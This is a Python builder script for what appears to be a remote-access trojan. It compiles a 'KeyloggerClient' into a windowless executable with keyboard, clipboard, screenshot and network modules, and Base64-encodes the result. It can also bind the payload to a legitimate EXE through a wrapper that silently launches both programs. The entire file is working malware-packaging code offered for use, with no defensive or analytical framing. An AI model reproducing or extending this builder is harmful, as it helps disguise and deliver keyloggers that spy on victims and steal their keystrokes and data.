import os
import subprocess
import logging
import sys
import shutil
import base64
import tkinter as tk
from tkinter import filedialog, messagebox
from rat_config import Config

# Configure logging
if Config.DEBUG_MODE:
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(Config.ERROR_LOG_FILE),
            logging.StreamHandler()
        ]
    )
else:
    logging.getLogger().addHandler(logging.NullHandler())
    logging.getLogger().setLevel(logging.CRITICAL + 1)

class Builder:
    def __init__(self):
        self.source_file = "main.py"
        self.output_dir = "dist"
        self.payload_exe = os.path.join(self.output_dir, "KeyloggerClient.exe")
        self.b64_output = os.path.join(self.output_dir, "KeyloggerClient_b64.txt")
        self.bind_output = os.path.join(self.output_dir, "binded_output.exe")

    def install_requirements(self):
        """Install dependencies from requirements.txt if it exists."""
        requirements_file = "requirements.txt"
        try:
            if os.path.exists(requirements_file):
                if Config.DEBUG_MODE:
                    logging.info(f"Installing dependencies from {requirements_file}...")
                subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=True)
                subprocess.run([sys.executable, "-m", "pip", "install", "-r", requirements_file], check=True)
                if Config.DEBUG_MODE:
                    logging.info("Dependencies installed successfully")
            else:
                if Config.DEBUG_MODE:
                    logging.warning(f"{requirements_file} not found, skipping dependency installation")
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to install dependencies: {str(e)}")
            raise Exception(f"Failed to install dependencies: {str(e)}")

    def build_payload(self):
        """Build the source code into an executable without obfuscation."""
        try:
            if Config.DEBUG_MODE:
                logging.info("Building payload with PyInstaller...")

            # Check if source file exists
            if not os.path.exists(self.source_file):
                raise Exception(f"Source file not found: {self.source_file}")

            # Create output directory if it doesn't exist
            os.makedirs(self.output_dir, exist_ok=True)

            # Build executable with PyInstaller
            pyinstaller_cmd = [
                "pyinstaller",
                "--noconfirm",
                "--onefile",
                "--nowindow",
                "--hidden-import", "keyboard",
                "--hidden-import", "pyautogui",
                "--hidden-import", "psutil",
                "--hidden-import", "pyperclip",
                "--hidden-import", "PIL",
                "--hidden-import", "pywin32",
                "--hidden-import", "requests",
                "--hidden-import", "dotenv",
                "--hidden-import", "packaging",
                "--hidden-import", "system.file_manager",
                "--distpath", self.output_dir,
                "--specpath", "build",
                self.source_file
            ]
            if Config.DEBUG_MODE:
                logging.debug(f"Executing PyInstaller command: {' '.join(pyinstaller_cmd)}")
            subprocess.run(pyinstaller_cmd, check=True)

            # Rename the output executable
            original_exe = os.path.join(self.output_dir, "main.exe")
            if os.path.exists(original_exe):
                shutil.move(original_exe, self.payload_exe)
                if Config.DEBUG_MODE:
                    logging.info(f"Payload built successfully: {self.payload_exe}")
            else:
                raise Exception("PyInstaller output not found")

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Build error: {str(e)}")
            raise Exception(f"Failed to build payload: {str(e)}")

    def encode_payload_to_base64(self):
        """Encode the built payload executable to Base64."""
        try:
            if Config.DEBUG_MODE:
                logging.info(f"Encoding payload to Base64: {self.payload_exe}")

            # Check if payload executable exists
            if not os.path.exists(self.payload_exe):
                raise Exception(f"Payload executable not found: {self.payload_exe}")

            # Read the executable as binary and encode to Base64
            with open(self.payload_exe, 'rb') as f:
                binary_data = f.read()
                b64_encoded = base64.b64encode(binary_data).decode('utf-8')

            # Save the Base64-encoded string to a text file
            with open(self.b64_output, 'w', encoding='utf-8') as f:
                f.write(b64_encoded)
            if Config.DEBUG_MODE:
                logging.info(f"Base64-encoded payload saved to: {self.b64_output}")

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Base64 encoding error: {str(e)}")
            raise Exception(f"Failed to encode payload to Base64: {str(e)}")

    def bind_exe(self, target_exe):
        """Bind the payload with another EXE file."""
        try:
            if Config.DEBUG_MODE:
                logging.info(f"Binding payload with {target_exe}...")

            if not os.path.exists(self.payload_exe):
                raise Exception("Payload executable not found")

            if not os.path.exists(target_exe):
                raise Exception(f"Target EXE not found: {target_exe}")

            # Create a wrapper script to execute both EXEs
            wrapper_code = f"""
import subprocess
import os
import sys

def run_target_exe():
    try:
        subprocess.Popen(r"{target_exe}", shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        pass

def run_payload():
    try:
        subprocess.Popen(r"{self.payload_exe}", shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        pass

if __name__ == "__main__":
    run_target_exe()
    run_payload()
"""
            wrapper_script = "wrapper.py"
            with open(wrapper_script, "w", encoding="utf-8") as f:
                f.write(wrapper_code)

            # Build the wrapper script into an executable
            pyinstaller_cmd = [
                "pyinstaller",
                "--noconfirm",
                "--onefile",
                "--nowindow",
                "--distpath", self.output_dir,
                "--specpath", "build",
                wrapper_script
            ]
            if Config.DEBUG_MODE:
                logging.debug(f"Executing PyInstaller command: {' '.join(pyinstaller_cmd)}")
            subprocess.run(pyinstaller_cmd, check=True)

            # Rename the wrapper output
            original_wrapper = os.path.join(self.output_dir, "wrapper.exe")
            if os.path.exists(original_wrapper):
                shutil.move(original_wrapper, self.bind_output)
                if Config.DEBUG_MODE:
                    logging.info(f"Binding completed: {self.bind_output}")
            else:
                raise Exception("Wrapper executable not found")

            # Clean up temporary wrapper script
            os.remove(wrapper_script)

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Binding error: {str(e)}")
            raise Exception(f"Failed to bind EXE: {str(e)}")

    def run(self):
        """Run the build process with user interaction for local execution."""
        root = None
        try:
            # Install dependencies
            self.install_requirements()

            # Build the payload
            self.build_payload()

            # Encode the payload to Base64
            self.encode_payload_to_base64()

            # Check if running in a CI/CD environment (e.g., GitHub Actions)
            if os.getenv('CI') or os.getenv('GITHUB_ACTIONS'):
                if Config.DEBUG_MODE:
                    logging.info("Running in CI/CD environment, skipping binding.")
                return

            # Ask user if they want to bind with another EXE (local execution only)
            root = tk.Tk()
            root.withdraw()  # Hide the main window
            if messagebox.askyesno("EXE Binding", "Do you want to bind the payload with another EXE file?"):
                file_path = filedialog.askopenfilename(
                    title="Select EXE File",
                    filetypes=[("Executable files", "*.exe")]
                )
                if file_path:
                    self.bind_exe(file_path)
                    messagebox.showinfo("Success", f"File successfully bound: {self.bind_output}\nNon-bound payload: {self.payload_exe}\nBase64 encoded: {self.b64_output}")
                else:
                    messagebox.showwarning("Warning", "No file selected.\nNon-bound payload: {self.payload_exe}\nBase64 encoded: {self.b64_output}")
            else:
                messagebox.showinfo("Success", f"Payload built without binding: {self.payload_exe}\nBase64 encoded: {self.b64_output}")

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Build process error: {str(e)}")
            if not (os.getenv('CI') or os.getenv('GITHUB_ACTIONS')):
                messagebox.showerror("Error", f"Build process failed: {str(e)}")
            raise Exception(f"Build process failed: {str(e)}")
        finally:
            if root:
                root.destroy()

if __name__ == "__main__":
    if Config.TEST_MODE:
        print("Test mode enabled: Skipping actual build process.")
    else:
        builder = Builder()
        builder.run()